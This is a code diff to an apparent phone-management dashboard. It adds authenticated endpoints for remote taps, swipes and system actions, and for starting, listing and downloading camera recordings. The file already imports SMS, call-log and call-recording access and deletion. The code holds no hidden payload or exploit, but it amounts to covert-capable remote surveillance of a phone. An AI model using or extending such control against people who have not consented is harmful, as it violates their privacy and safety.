@@ -19,6 +19,8 @@ from .device_client import (
     camera_capture_file, call_logs, sms, callrecorder_status,
     callrecorder_toggle, call_recordings, video_record, video_list, video_file,
     battery, sms_delete, calllog_delete, screen_status, stream, ws_live,
+    control_tap, control_longpress, control_swipe, control_action,
+    record_start, record_stop, record_status, record_list, record_file,
 )
 from .device_manager import registry
 
@@ -330,6 +332,144 @@ async def device_calllog_delete(host: str, port: int, req: IdRequest,
     info, _ = calllog_delete(dev.host, req.id, dev.token or "", dev.port,
                              cert_fp=dev.cert_fp or None)
     return info
+
+# ---------- Remote-admin control (v2.3.3) ----------
+
+class TapRequest(BaseModel):
+    x: float
+    y: float
+
+class SwipeRequest(BaseModel):
+    x1: float
+    y1: float
+    x2: float
+    y2: float
+    durationMs: int | None = None
+
+class ActionRequest(BaseModel):
+    action: str
+
+@app.post("/api/device/{host}/{port}/control/tap")
+async def device_control_tap(host: str, port: int, req: TapRequest,
+                             _=Depends(require_login)):
+    key = f"{host}:{port}"
+    dev, err = _paired_device_or_error(key)
+    if err:
+        return err
+    if dev is None:
+        return {"error": "not_found", "message": "Device not found"}
+    info, _ = control_tap(dev.host, dev.token or "", req.x, req.y,
+                          dev.port, cert_fp=dev.cert_fp or None)
+    return info
+
+@app.post("/api/device/{host}/{port}/control/longpress")
+async def device_control_longpress(host: str, port: int, req: TapRequest,
+                                   _=Depends(require_login)):
+    key = f"{host}:{port}"
+    dev, err = _paired_device_or_error(key)
+    if err:
+        return err
+    if dev is None:
+        return {"error": "not_found", "message": "Device not found"}
+    info, _ = control_longpress(dev.host, dev.token or "", req.x, req.y,
+                                dev.port, cert_fp=dev.cert_fp or None)
+    return info
+
+@app.post("/api/device/{host}/{port}/control/swipe")
+async def device_control_swipe(host: str, port: int, req: SwipeRequest,
+                               _=Depends(require_login)):
+    key = f"{host}:{port}"
+    dev, err = _paired_device_or_error(key)
+    if err:
+        return err
+    if dev is None:
+        return {"error": "not_found", "message": "Device not found"}
+    info, _ = control_swipe(dev.host, dev.token or "", req.x1, req.y1,
+                            req.x2, req.y2, req.durationMs, dev.port,
+                            cert_fp=dev.cert_fp or None)
+    return info
+
+@app.post("/api/device/{host}/{port}/control/action")
+async def device_control_action(host: str, port: int, req: ActionRequest,
+                                _=Depends(require_login)):
+    key = f"{host}:{port}"
+    dev, err = _paired_device_or_error(key)
+    if err:
+        return err
+    if dev is None:
+        return {"error": "not_found", "message": "Device not found"}
+    info, _ = control_action(dev.host, dev.token or "", req.action,
+                             dev.port, cert_fp=dev.cert_fp or None)
+    return info
+
+@app.post("/api/device/{host}/{port}/record/start")
+async def device_record_start(host: str, port: int, lens: str = "back",
+                              _=Depends(require_login)):
+    key = f"{host}:{port}"
+    dev, err = _paired_device_or_error(key)
+    if err:
+        return err
+    if dev is None:
+        return {"error": "not_found", "message": "Device not found"}
+    info, _ = record_start(dev.host, dev.token or "", lens,
+                           dev.port, cert_fp=dev.cert_fp or None)
+    return info
+
+@app.post("/api/device/{host}/{port}/record/stop")
+async def device_record_stop(host: str, port: int, _=Depends(require_login)):
+    key = f"{host}:{port}"
+    dev, err = _paired_device_or_error(key)
+    if err:
+        return err
+    if dev is None:
+        return {"error": "not_found", "message": "Device not found"}
+    info, _ = record_stop(dev.host, dev.token or "", dev.port,
+                          cert_fp=dev.cert_fp or None)
+    return info
+
+@app.get("/api/device/{host}/{port}/record/status")
+async def device_record_status(host: str, port: int, _=Depends(require_login)):
+    key = f"{host}:{port}"
+    dev, err = _paired_device_or_error(key)
+    if err:
+        return err
+    if dev is None:
+        return {"error": "not_found", "message": "Device not found"}
+    info, _ = record_status(dev.host, dev.token or "", dev.port,
+                            cert_fp=dev.cert_fp or None)
+    return info
+
+@app.get("/api/device/{host}/{port}/record/list")
+async def device_record_list(host: str, port: int, _=Depends(require_login)):
+    key = f"{host}:{port}"
+    dev, err = _paired_device_or_error(key)
+    if err:
+        return err
+    if dev is None:
+        return {"error": "not_found", "message": "Device not found"}
+    info, _ = record_list(dev.host, dev.token or "", dev.port,
+                          cert_fp=dev.cert_fp or None)
+    return info
+
+@app.get("/api/device/{host}/{port}/record/{media}/{rec_id}/file")
+async def device_record_file(host: str, port: int, media: str, rec_id: str,
+                             _=Depends(require_login)):
+    """Proxy a triple-recording MP4 to the browser (<video> plays it). The
+    dashboard downloads the whole file from the phone, then serves it — no
+    streaming plumbing needed for the direct PLAY path."""
+    key = f"{host}:{port}"
+    dev, err = _paired_device_or_error(key)
+    if err:
+        return err
+    if dev is None:
+        return {"error": "not_found", "message": "Device not found"}
+    status, data, _pin = record_file(dev.host, dev.token or "", media,
+                                     rec_id, dev.port,
+                                     cert_fp=dev.cert_fp or None)
+    if status != 200 or not data:
+        raise HTTPException(502, f"phone returned {status}")
+    return Response(content=data, media_type="video/mp4",
+                    headers={"Content-Disposition": f'attachment; filename="{rec_id}"'})
 
 @app.get("/api/device/{host}/{port}/stream/screen")
 async def device_screen_stream(host: str, port: int, quality: int = 70,
